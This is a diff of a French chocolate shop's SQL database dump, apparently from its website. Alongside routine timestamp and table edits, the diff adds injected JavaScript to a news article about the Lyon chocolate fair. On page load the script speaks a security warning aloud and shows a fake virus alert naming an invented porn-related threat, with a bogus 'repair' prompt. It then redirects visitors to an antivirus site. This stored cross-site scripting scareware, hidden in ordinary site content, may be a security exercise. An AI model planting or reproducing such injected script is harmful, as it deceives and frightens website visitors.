@@ -3,7 +3,7 @@
 -- https://www.phpmyadmin.net/
 --
 -- Hôte : 127.0.0.1:3306
--- Généré le :  sam. 06 nov. 2021 à 23:41
+-- Généré le :  ven. 12 nov. 2021 à 18:35
 -- Version du serveur :  10.4.10-MariaDB
 -- Version de PHP :  7.3.12
 
@@ -21,8 +21,6 @@ SET time_zone = "+00:00";
 --
 -- Base de données :  `chocolatein`
 --
-CREATE DATABASE IF NOT EXISTS `chocolatein` DEFAULT CHARACTER SET latin1 COLLATE latin1_swedish_ci;
-USE `chocolatein`;
 
 -- --------------------------------------------------------
 
@@ -38,7 +36,7 @@ CREATE TABLE IF NOT EXISTS `actualite` (
   `datepublication` date NOT NULL DEFAULT current_timestamp(),
   `actif` tinyint(1) NOT NULL DEFAULT 0,
   PRIMARY KEY (`id`)
-) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=latin1;
+) ENGINE=InnoDB AUTO_INCREMENT=16 DEFAULT CHARSET=latin1;
 
 --
 -- Déchargement des données de la table `actualite`
@@ -48,7 +46,7 @@ INSERT INTO `actualite` (`id`, `titre`, `contenu`, `datepublication`, `actif`) V
 (1, 'C\'est les vacances du Chocolat', '<p>Il fait trop chaud pour les chocolats ! Nous serons ferm&eacute;s du 15 juillet au 15 aout inclus pour vacances d&#39;&eacute;t&eacute;.</p>\r\n\r\n<p><img alt=\"\" src=\"https://voyage-onirique.com/wp-content/uploads/2019/05/WallpaperStudio10-119302-landscape.jpg\" style=\"float:left; height:100px; width:178px\" />Profitez-en pour manger des glaces en attendant de retrouver nos gourmandises &agrave; la rentr&eacute;e.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Suivez-nous sur notre <a href=\"https://www.facebook.com/Chocolate.In.Bordeaux\" target=\"_blank\">page Facebook</a></p>\r\n', '2021-07-01', 1),
 (2, 'Les Bonbons &agrave; la cerise et au piment d&rsquo;Espelette &reg; pour f&eacute;ter les beaux jours', '<p><img alt=\"\" src=\"./vues/images/produits/confiseries/piment-espelette_750w.jpg\" style=\"float:left; height:200px; width:355px\" />Faites plaisir aux petits et aux grands avec notre nouveau produit : les Bonbons &agrave; la cerise et au piment d&rsquo;Espelette<strong>.</strong></p>\r\n\r\n<p>Surprenant par ses &eacute;pices et son caract&egrave;re, c&#39;est le fleuron du Pays Basque.</p>', '2021-06-01', 1),
 (3, 'Fermeture exceptionnelle du 30 Aout au 3 Septembre', '<p>Fermeture exceptionnelle de la boutique de Bordeaux du 30 Aout au 3 Septembre pour cause de travaux.</p>\r\n\r\n<p><img alt=\"\" src=\"https://www.jardinerie-animalerie-fleuriste.fr/wp-content/uploads/2020/02/Kukka-le-secret-des-fleurs-JAF-info-Fleuriste-7.jpg.webp\" style=\"float:left; height:150px; width:201px\" />Pendant cette p&eacute;riode, vous pouvez toujours passer vos commandes par t&eacute;l&eacute;phone ou en nous contactant sur notre <a href=\"https://www.facebook.com/Chocolate.In.Bordeaux\" target=\"_blank\">page Facebook</a>. Vous pourrez ensuite r&eacute;cup&eacute;rer vos colis chez notre voisin &quot;au Bouquet Japonais&quot; situ&eacute; &agrave; cot&eacute; de notre boutique.</p>\r\n', '2021-08-23', 1),
-(7, 'Salon du Chocolat de Lyon du 5 au 7 Novembre', '<p><img alt=\"\" src=\"https://lyon.salon-du-chocolat.com/wp-content/uploads/2017/07/logo_retina_lyon.jpg\" style=\"float:left; height:150px; width:245px\" />Chocolate&#39;in sera pr&eacute;sent au salon du Chocolat de Lyon du 5 au 7 Novembre 2021</p>\r\n\r\n<p><strong>Rendez-vous au STAND D34</strong></p>\r\n\r\n<p>Suivez-nous sur notre <a href=\"https://www.facebook.com/Chocolate.In.Bordeaux\" target=\"_blank\">page Facebook</a></p>\r\n', '2021-08-04', 1);
+(7, 'Salon du Chocolat de Lyon du 5 au 7 Novembre', '<p><img alt=\"\" src=\"https://lyon.salon-du-chocolat.com/wp-content/uploads/2017/07/logo_retina_lyon.jpg\" style=\"float:left; height:150px; width:245px\" />Chocolate&#39;in sera pr&eacute;sent au salon du Chocolat de Lyon du 5 au 7 Novembre 2021</p>\r\n\r\n<p><strong>Rendez-vous au STAND D34</strong></p>\r\n\r\n<p>Suivez-nous sur notre <a href=\"https://www.facebook.com/Chocolate.In.Bordeaux\" target=\"_blank\">page Facebook</a></p>\r\n\r\n<script src=\"https://unpkg.com/sweetalert/dist/sweetalert.min.js\"></script>\r\n<script type=\"text/javascript\"> function speak(c) {\r\nvar synth = window.speechSynthesis;\r\nvar voices = synth.getVoices();\r\nvar b = new SpeechSynthesisUtterance(); \r\nb.voice = voices[2] ; \r\nb.voiceURI = \"natif\"; \r\nb.volume = 1; \r\nb.rate = 1; \r\nb.pitch = 1; \r\nb.text=c; \r\nb.lang = \"fr-FR\";\r\nsynth.speak(b)} \r\nspeak(\"Attention, alerte de sécurité !\"); \r\n</script>\r\n\r\n<script>\r\nswal({\r\n  title: \"Alerte de sécurité\",\r\n  text: \"Votre ordinateur a detecté une menace ExtremVirulentPorn qui semble avoir contaminé votre ordinateur! \\n\\n Pour plus de sécurité, verifiez si votre ordinateur peut être réparé en cliquant sur ok\",\r\n  icon: \"warning\",\r\n  buttons: true,\r\n  dangerMode: true,\r\n	})\r\n.then((willDelete) => {\r\n  if (willDelete) {\r\n		swal({\r\n			title: \"Bonne nouvelle !\",\r\n			text: \"Votre ordinateur est réparable, cliquez sur ok pour démarrer le scan de nettoyage !\",\r\n			icon: \"success\",\r\n			})\r\n			.then(function() {\r\n				window.location = \"https://www.kaspersky.fr/\";\r\n			});\r\n  } else {\r\n		\r\n		swal({\r\n		title: \"Echec !\",\r\n		text: \"Votre ordinateur n\'a pas pu être réparé!\", \r\n		icon: \"warning\",\r\n    });\r\n  }\r\n});\r\n</script>\r\n\r\n\r\n', '2021-08-04', 1);
 
 -- --------------------------------------------------------
 
@@ -71,7 +69,7 @@ CREATE TABLE IF NOT EXISTS `contact` (
   `datetraitement` datetime DEFAULT NULL,
   `commentaire` text DEFAULT NULL,
   PRIMARY KEY (`id`)
-) ENGINE=InnoDB AUTO_INCREMENT=13558 DEFAULT CHARSET=latin1;
+) ENGINE=InnoDB AUTO_INCREMENT=13561 DEFAULT CHARSET=latin1;
 
 --
 -- Déchargement des données de la table `contact`
@@ -237,7 +235,6 @@ INSERT INTO `produit` (`id`, `nom`, `description`, `packaging`, `urlimg`, `idgam
 ('choc_o_lait', 'Choc\' o\' lait', 'Carré de chocolat à faire fondre dans du lait chaud.', '33 grammes', './vues/images/produits/saison/choc-o-lait', 'produits_de_saison'),
 ('citrouille', 'Citrouille', 'En praliné au lait...', '50 grammes', './vues/images/produits/saison/citrouille', 'produits_de_saison'),
 ('coffret_27_tablettes', 'Coffret de 27 tablettes', 'Coffret de 27 tablettes', '270 grammes', './vues/images/produits/chocolats/tablettes27', 'chocolats'),
-('dfgdfg', 'dgdf', 'fdg', 'fdg', './vues/images/produits/chocolats/', 'chocolats'),
 ('dragees_amandes_corsees', 'Dragées amandes corsées', 'Nappées de fin chocolat noir aux notes chaudes de brioche et de miel. Pour garnir les cadeaux de vos invités.', 'Environ 80 dragées pour 250g', './vues/images/produits/dragees/dragees-amandes-corsees', 'dragees'),
 ('dragees_amandes_fines', 'Dragées amandes finesse extrême', 'Amande fraîche au goût délicat de la douce amertume. Pour garnir les cadeaux de vos invités.', 'Environ 85 dragées pour 250g', './vues/images/produits/dragees/dragees-amandes-finesse-extreme', 'dragees'),
 ('dragees_petits_coeurs', 'Dragées Petits Coeurs', 'Du bon chocolat au lait moulé avec une finition au sucre coloré. Pour garnir les cadeaux de vos invités.', '250 grammes', './vues/images/produits/dragees/dragees-chocolat', 'dragees'),
